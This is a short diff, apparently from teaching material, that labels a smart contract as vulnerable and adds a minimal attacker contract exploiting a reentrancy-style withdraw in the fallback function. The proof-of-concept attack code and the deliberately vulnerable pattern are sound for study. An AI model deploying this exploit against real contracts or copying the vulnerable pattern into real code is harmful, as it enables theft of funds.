@@ -1,3 +1,4 @@
+// Vulnerable contract
 #include "vntlib.h"
 
 typedef struct {
@@ -47,3 +48,16 @@ $_(){ // fallback function
     withdraw(amount);
   }
 }
+
+
+// Attacker contract
+#include "vntlib.h"
+CALL void withdraw(CallParams params, uint256 amount);
+
+void attack () {
+  CallParams prams = {Address("0xaaaa"), U256(10000), 100000};  // "0xaaaa" represents Vulnerable contract.
+  withdraw(prams, 100);
+}
+
+...
+
